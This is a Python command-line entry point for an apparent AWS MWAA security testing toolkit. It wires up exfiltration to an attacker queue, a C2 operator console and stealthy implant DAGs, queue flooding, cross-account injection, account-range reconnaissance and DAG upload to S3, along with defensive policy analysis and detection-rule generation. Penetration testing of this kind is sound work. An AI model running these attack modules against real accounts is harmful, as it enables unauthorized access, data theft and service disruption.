"""
Main CLI entry point for the MWAA SQS Security Testing Tool.

Usage:
    python -m mwaa_security_tool <module> <action> [options]

Modules:
    exfil       - Data exfiltration testing
    c2          - Command & Control channel testing
    dos         - Denial of Service simulation
    inject      - Cross-account event injection
    recon       - Infrastructure reconnaissance
    dag         - DAG payload generation
    analyze     - IAM policy analysis & detection
    full-test   - Run all safe capability tests
"""

import argparse
import json
import os
import sys

from .config import AttackerConfig, TargetConfig
from .utils import setup_logging, print_banner, print_section, print_success, print_fail, print_info, print_warn


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="mwaa-security-tool",
        description="MWAA SQS Execution Role Security Testing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable debug logging")
    parser.add_argument("--attacker-account", required=False, help="Attacker AWS account ID")
    parser.add_argument("--attacker-region", default="us-east-1", help="Attacker AWS region")
    parser.add_argument("--attacker-profile", default=None, help="Attacker AWS CLI profile")
    parser.add_argument("--source-profile", default=None,
                        help="AWS profile simulating the MWAA execution role (for cross-account tests)")
    parser.add_argument("--source-region", default=None, help="AWS region for source profile")

    sub = parser.add_subparsers(dest="module", help="Module to run")

    # ── Exfiltration ─────────────────────────────────────────────
    exfil = sub.add_parser("exfil", help="Data exfiltration testing")
    exfil_sub = exfil.add_subparsers(dest="action")

    exfil_setup = exfil_sub.add_parser("setup", help="Create attacker-side exfil queue")
    exfil_setup.add_argument("--queue-name", default=None, help="Custom queue name")

    exfil_listen = exfil_sub.add_parser("listen", help="Listen for exfiltrated data")
    exfil_listen.add_argument("--queue-name", default=None, help="Queue name to listen on")
    exfil_listen.add_argument("--duration", type=int, default=300, help="Listen duration (seconds)")

    exfil_test = exfil_sub.add_parser("test", help="Direct exfiltration test (no MWAA needed)")
    exfil_test.add_argument("--queue-name", default=None, help="Target queue name")

    exfil_sub.add_parser("cleanup", help="Delete exfil queue")

    # ── C2 Channel ───────────────────────────────────────────────
    c2 = sub.add_parser("c2", help="Command & Control channel testing")
    c2_sub = c2.add_subparsers(dest="action")

    c2_sub.add_parser("setup", help="Create C2 infrastructure (command + results queues)")

    c2_send = c2_sub.add_parser("send", help="Send a command to the implant")
    c2_send.add_argument("command", help="Command to send")

    c2_sub.add_parser("recv", help="Poll for results from the implant")

    c2_sub.add_parser("operator", help="Interactive operator console")

    c2_sub.add_parser("test", help="Full C2 roundtrip test (no MWAA needed)")

    c2_sub.add_parser("cleanup", help="Delete C2 queues")

    # ── DoS Simulation ───────────────────────────────────────────
    dos = sub.add_parser("dos", help="Denial of Service simulation")
    dos_sub = dos.add_subparsers(dest="action")

    dos_assess = dos_sub.add_parser("assess", help="Safe DoS risk assessment")

    dos_flood = dos_sub.add_parser("flood", help="Message flooding test")
    dos_flood.add_argument("--target-queue-url", default=None, help="Target queue URL")
    dos_flood.add_argument("--message-count", type=int, default=100, help="Number of messages")
    dos_flood.add_argument("--rate-limit", type=int, default=10, help="Messages per second")

    dos_consume = dos_sub.add_parser("consume", help="Message consumption test")
    dos_consume.add_argument("--target-queue-url", required=True, help="Target queue URL")
    dos_consume.add_argument("--max-consume", type=int, default=10, help="Max messages to consume")
    dos_consume.add_argument("--live", action="store_true", help="Delete consumed messages (DESTRUCTIVE)")

    # ── Event Injection ──────────────────────────────────────────
    inject = sub.add_parser("inject", help="Cross-account event injection")
    inject_sub = inject.add_subparsers(dest="action")

    inject_sub.add_parser("list-payloads", help="List available injection payloads")

    inject_send = inject_sub.add_parser("send", help="Inject a message into a target queue")
    inject_send.add_argument("--target-account", required=True, help="Target AWS account ID")
    inject_send.add_argument("--target-queue", required=True, help="Target queue name")
    inject_send.add_argument("--target-region", default="us-east-1", help="Target region")
    inject_send.add_argument("--payload", default="benign", help="Payload name or 'custom'")
    inject_send.add_argument("--custom-payload", default=None, help="Custom JSON payload string")

    inject_all = inject_sub.add_parser("send-all", help="Send all probe payloads")
    inject_all.add_argument("--target-account", required=True, help="Target AWS account ID")
    inject_all.add_argument("--target-queue", required=True, help="Target queue name")
    inject_all.add_argument("--target-region", default="us-east-1", help="Target region")

    inject_sub.add_parser("test", help="Safe injection test (self-target)")

    # ── Recon ────────────────────────────────────────────────────
    recon = sub.add_parser("recon", help="Infrastructure reconnaissance")
    recon_sub = recon.add_subparsers(dest="action")

    recon_scan = recon_sub.add_parser("scan", help="Scan accounts for MWAA queues")
    recon_scan.add_argument("--accounts", required=True, help="Comma-separated account IDs or file path")
    recon_scan.add_argument("--region", default="us-east-1", help="Region to scan")
    recon_scan.add_argument("--threads", type=int, default=5, help="Concurrent threads")
    recon_scan.add_argument("--queue-names", default=None,
                            help="Comma-separated custom queue names to probe")

    recon_range = recon_sub.add_parser("scan-range", help="Scan a numeric range of account IDs")
    recon_range.add_argument("--start", type=int, required=True, help="Starting account ID (numeric)")
    recon_range.add_argument("--count", type=int, default=100, help="Number of accounts to scan")
    recon_range.add_argument("--region", default="us-east-1", help="Region to scan")
    recon_range.add_argument("--threads", type=int, default=5, help="Concurrent threads")

    recon_sub.add_parser("test", help="Test recon capability (self-target)")

    # ── DAG Generator ────────────────────────────────────────────
    dag = sub.add_parser("dag", help="DAG payload generation")
    dag_sub = dag.add_subparsers(dest="action")

    dag_gen = dag_sub.add_parser("generate", help="Generate DAG payloads")
    dag_gen.add_argument("--type", choices=["exfil", "c2", "recon", "dos", "all"],
                         default="all", help="DAG type to generate")
    dag_gen.add_argument("--output-dir", default="./generated_dags", help="Output directory")
    dag_gen.add_argument("--target-accounts", default=None,
                         help="Comma-separated target accounts (for recon DAG)")
    dag_gen.add_argument("--dos-target-account", default=None, help="DoS target account ID")
    dag_gen.add_argument("--dos-target-queue", default=None, help="DoS target queue name")
    # C2 DAG options
    dag_gen.add_argument("--c2-poll-interval", type=int, default=5,
                         help="C2 implant poll interval in minutes (default: 5)")
    dag_gen.add_argument("--c2-jitter", type=int, default=30,
                         help="Max random jitter in seconds added per poll cycle (default: 30)")
    dag_gen.add_argument("--c2-stealth", action="store_true",
                         help="Use innocuous DAG name/tags to blend with normal workloads")

    dag_upload = dag_sub.add_parser("upload", help="Upload a DAG file to S3")
    dag_upload.add_argument("--file", required=True, help="Local DAG file path")
    dag_upload.add_argument("--bucket", required=True, help="Target S3 bucket")
    dag_upload.add_argument("--prefix", default="dags/", help="S3 key prefix")
    dag_upload.add_argument("--target-profile", default=None, help="AWS profile for S3 upload")
    dag_upload.add_argument("--target-region", default="us-east-1", help="S3 bucket region")

    # ── Policy Analyzer ──────────────────────────────────────────
    analyze = sub.add_parser("analyze", help="IAM policy analysis & detection")
    analyze_sub = analyze.add_subparsers(dest="action")

    analyze_role = analyze_sub.add_parser("role", help="Analyze a specific IAM role")
    analyze_role.add_argument("--role-name", required=True, help="IAM role name")
    analyze_role.add_argument("--region", default="us-east-1")
    analyze_role.add_argument("--profile", default=None)

    analyze_sub.add_parser("enumerate", help="Enumerate MWAA environments and roles")
    analyze_sub.add_parser("full", help="Full assessment (enumerate + analyze all)")

    analyze_detect = analyze_sub.add_parser("detection-rules", help="Generate detection rules")
    analyze_detect.add_argument("--output-dir", default="./detection_rules", help="Output directory")

    # ── Full Test ────────────────────────────────────────────────
    sub.add_parser("full-test", help="Run all safe capability tests end-to-end")

    return parser


def run_full_test(attacker: AttackerConfig, args) -> None:
    """Run all safe capability tests."""
    from .modules import exfiltration, c2_channel, dos_simulation, event_injection, recon

    print_section("FULL CAPABILITY TEST SUITE")
    print_info("Running all safe tests using attacker account as both source and target.")
    print_info("No real MWAA environment is required.\n")

    results = {}

    # 1. Exfiltration
    print_section("Test 1/5: Data Exfiltration")
    try:
        exfiltration.setup_receiver(attacker)
        results["exfiltration"] = exfiltration.test_direct_send(
            attacker,
            source_profile=args.source_profile,
            source_region=args.source_region,
        )
        exfiltration.cleanup(attacker)
    except Exception as e:
        print_fail(f"Exfiltration test error: {e}")
        results["exfiltration"] = False

    # 2. C2 Channel
    print_section("Test 2/5: C2 Channel")
    try:
        c2_channel.setup_c2_infra(attacker)
        results["c2_channel"] = c2_channel.test_c2_roundtrip(
            attacker,
            source_profile=args.source_profile,
            source_region=args.source_region,
        )
        c2_channel.cleanup(attacker)
    except Exception as e:
        print_fail(f"C2 test error: {e}")
        results["c2_channel"] = False

    # 3. DoS Assessment
    print_section("Test 3/5: DoS Assessment")
    try:
        dos_results = dos_simulation.assess_dos_risk(
            attacker,
            source_profile=args.source_profile,
            source_region=args.source_region,
        )
        results["dos"] = all(dos_results.values())
    except Exception as e:
        print_fail(f"DoS assessment error: {e}")
        results["dos"] = False

    # 4. Event Injection
    print_section("Test 4/5: Event Injection")
    try:
        results["event_injection"] = event_injection.test_injection_safe(
            attacker,
            source_profile=args.source_profile,
            source_region=args.source_region,
        )
    except Exception as e:
        print_fail(f"Injection test error: {e}")
        results["event_injection"] = False

    # 5. Recon
    print_section("Test 5/5: Infrastructure Reconnaissance")
    try:
        results["recon"] = recon.test_recon_capability(
            attacker,
            source_profile=args.source_profile,
            source_region=args.source_region,
        )
    except Exception as e:
        print_fail(f"Recon test error: {e}")
        results["recon"] = False

    # Final Report
    print_section("FULL TEST RESULTS")
    all_pass = True
    for test_name, passed in results.items():
        status = "PASS" if passed else "FAIL"
        if passed:
            print_success(f"{test_name}: {status}")
        else:
            print_fail(f"{test_name}: {status}")
            all_pass = False

    print()
    if all_pass:
        print_warn("ALL TESTS PASSED: The MWAA execution role SQS policy is fully exploitable.")
        print_warn("All 5 attack vectors (exfiltration, C2, DoS, injection, recon) are viable.")
    else:
        passed_count = sum(1 for v in results.values() if v)
        print_info(f"{passed_count}/{len(results)} tests passed.")


def main():
    parser = build_parser()
    args = parser.parse_args()

    setup_logging(args.verbose)
    print_banner()

    # Build attacker config
    attacker = None
    if args.attacker_account:
        attacker = AttackerConfig(
            account_id=args.attacker_account,
            region=args.attacker_region,
            profile=args.attacker_profile,
        )

    # Dispatch to modules
    if args.module == "exfil":
        from .modules import exfiltration
        if not attacker:
            parser.error("--attacker-account is required for exfil module")

        if args.action == "setup":
            queue_name = args.queue_name or "airflow-celery-exfil-data"
            exfiltration.setup_receiver(attacker, queue_name)
        elif args.action == "listen":
            queue_name = args.queue_name or "airflow-celery-exfil-data"
            exfiltration.listen(attacker, queue_name, args.duration)
        elif args.action == "test":
            queue_name = args.queue_name or "airflow-celery-exfil-data"
            exfiltration.test_direct_send(attacker, queue_name, args.source_profile, args.source_region)
        elif args.action == "cleanup":
            exfiltration.cleanup(attacker)
        else:
            parser.parse_args(["exfil", "-h"])

    elif args.module == "c2":
        from .modules import c2_channel
        if not attacker:
            parser.error("--attacker-account is required for c2 module")

        if args.action == "setup":
            c2_channel.setup_c2_infra(attacker)
        elif args.action == "send":
            c2_channel.send_command(attacker, args.command)
            print_success(f"Command sent: {args.command}")
        elif args.action == "recv":
            results = c2_channel.receive_results(attacker)
            if results:
                for r in results:
                    c2_channel._display_result(r)
            else:
                print_info("No results available.")
        elif args.action == "operator":
            c2_channel.operator_console(attacker)
        elif args.action == "test":
            c2_channel.test_c2_roundtrip(attacker, args.source_profile, args.source_region)
        elif args.action == "cleanup":
            c2_channel.cleanup(attacker)
        else:
            parser.parse_args(["c2", "-h"])

    elif args.module == "dos":
        from .modules import dos_simulation
        if not attacker:
            parser.error("--attacker-account is required for dos module")

        if args.action == "assess":
            dos_simulation.assess_dos_risk(attacker, args.source_profile, args.source_region)
        elif args.action == "flood":
            dos_simulation.test_message_flood(
                attacker,
                target_queue_url=args.target_queue_url,
                message_count=args.message_count,
                rate_limit=args.rate_limit,
                source_profile=args.source_profile,
                source_region=args.source_region,
            )
        elif args.action == "consume":
            dos_simulation.test_message_consumption(
                attacker,
                target_queue_url=args.target_queue_url,
                max_consume=args.max_consume,
                source_profile=args.source_profile,
                source_region=args.source_region,
                dry_run=not args.live,
            )
        else:
            parser.parse_args(["dos", "-h"])

    elif args.module == "inject":
        from .modules import event_injection
        if args.action == "list-payloads":
            event_injection.list_payloads()
        elif args.action == "send":
            event_injection.inject_message(
                target_account_id=args.target_account,
                target_queue_name=args.target_queue,
                target_region=args.target_region,
                payload_name=args.payload,
                custom_payload=args.custom_payload,
                source_profile=args.source_profile,
                source_region=args.source_region,
            )
        elif args.action == "send-all":
            event_injection.inject_all_probes(
                target_account_id=args.target_account,
                target_queue_name=args.target_queue,
                target_region=args.target_region,
                source_profile=args.source_profile,
                source_region=args.source_region,
            )
        elif args.action == "test":
            if not attacker:
                parser.error("--attacker-account is required for inject test")
            event_injection.test_injection_safe(attacker, args.source_profile, args.source_region)
        else:
            parser.parse_args(["inject", "-h"])

    elif args.module == "recon":
        from .modules import recon as recon_mod
        if args.action == "scan":
            # Parse account IDs
            if os.path.isfile(args.accounts):
                with open(args.accounts) as f:
                    account_ids = [line.strip() for line in f if line.strip()]
            else:
                account_ids = [a.strip() for a in args.accounts.split(",")]

            queue_names = None
            if args.queue_names:
                queue_names = [q.strip() for q in args.queue_names.split(",")]

            recon_mod.run_recon(
                account_ids=account_ids,
                region=args.region,
                queue_names=queue_names,
                source_profile=args.source_profile,
                source_region=args.source_region,
                threads=args.threads,
            )
        elif args.action == "scan-range":
            recon_mod.scan_account_range(
                start_account=args.start,
                count=args.count,
                region=args.region,
                source_profile=args.source_profile,
                source_region=args.source_region,
                threads=args.threads,
            )
        elif args.action == "test":
            if not attacker:
                parser.error("--attacker-account is required for recon test")
            recon_mod.test_recon_capability(attacker, args.source_profile, args.source_region)
        else:
            parser.parse_args(["recon", "-h"])

    elif args.module == "dag":
        from .modules import dag_generator
        if not attacker:
            parser.error("--attacker-account is required for dag module")

        if args.action == "generate":
            output_dir = args.output_dir
            os.makedirs(output_dir, exist_ok=True)

            if args.type in ("exfil", "all"):
                dag_generator.generate_exfiltration_dag(
                    attacker,
                    output_path=os.path.join(output_dir, "dag_exfiltration.py"),
                )
            if args.type in ("c2", "all"):
                dag_generator.generate_c2_implant_dag(
                    attacker,
                    poll_interval_minutes=args.c2_poll_interval,
                    jitter_seconds=args.c2_jitter,
                    stealth=args.c2_stealth,
                    output_path=os.path.join(output_dir, "dag_c2_implant.py"),
                )
            if args.type in ("recon", "all"):
                target_accounts = []
                if args.target_accounts:
                    target_accounts = [a.strip() for a in args.target_accounts.split(",")]
                if target_accounts:
                    dag_generator.generate_recon_dag(
                        attacker, target_accounts,
                        output_path=os.path.join(output_dir, "dag_recon.py"),
                    )
                elif args.type == "recon":
                    print_warn("--target-accounts required for recon DAG generation")
            if args.type in ("dos", "all"):
                if args.dos_target_account and args.dos_target_queue:
                    dag_generator.generate_dos_dag(
                        target_account_id=args.dos_target_account,
                        target_queue_name=args.dos_target_queue,
                        output_path=os.path.join(output_dir, "dag_dos.py"),
                    )
                elif args.type == "dos":
                    print_warn("--dos-target-account and --dos-target-queue required for DoS DAG")

        elif args.action == "upload":
            with open(args.file) as f:
                dag_code = f.read()
            target = TargetConfig(
                s3_dag_bucket=args.bucket,
                s3_dag_prefix=args.prefix,
                region=args.target_region,
                profile=args.target_profile,
            )
            dag_generator.upload_dag_to_s3(target, dag_code, os.path.basename(args.file))
        else:
            parser.parse_args(["dag", "-h"])

    elif args.module == "analyze":
        from .modules import policy_analyzer
        if args.action == "role":
            policy_analyzer.analyze_role(args.role_name, args.region, args.profile)
        elif args.action == "enumerate":
            region = args.attacker_region
            profile = args.attacker_profile
            policy_analyzer.enumerate_mwaa_environments(region, profile)
        elif args.action == "full":
            region = args.attacker_region
            profile = args.attacker_profile
            policy_analyzer.full_assessment(region, profile)
        elif args.action == "detection-rules":
            output_dir = args.output_dir
            os.makedirs(output_dir, exist_ok=True)

            # Config Guard rule
            rule = policy_analyzer.generate_config_guard_rule()
            rule_path = os.path.join(output_dir, "mwaa_sqs_wildcard.guard")
            with open(rule_path, "w") as f:
                f.write(rule)
            print_success(f"Config Guard rule: {rule_path}")

            # CloudWatch queries
            queries = policy_analyzer.generate_cloudwatch_detection_queries()
            queries_path = os.path.join(output_dir, "cloudwatch_queries.json")
            with open(queries_path, "w") as f:
                json.dump(queries, f, indent=2)
            print_success(f"CloudWatch queries: {queries_path}")
        else:
            parser.parse_args(["analyze", "-h"])

    elif args.module == "full-test":
        if not attacker:
            parser.error("--attacker-account is required for full-test")
        run_full_test(attacker, args)

    else:
        parser.print_help()


if __name__ == "__main__":
    main()
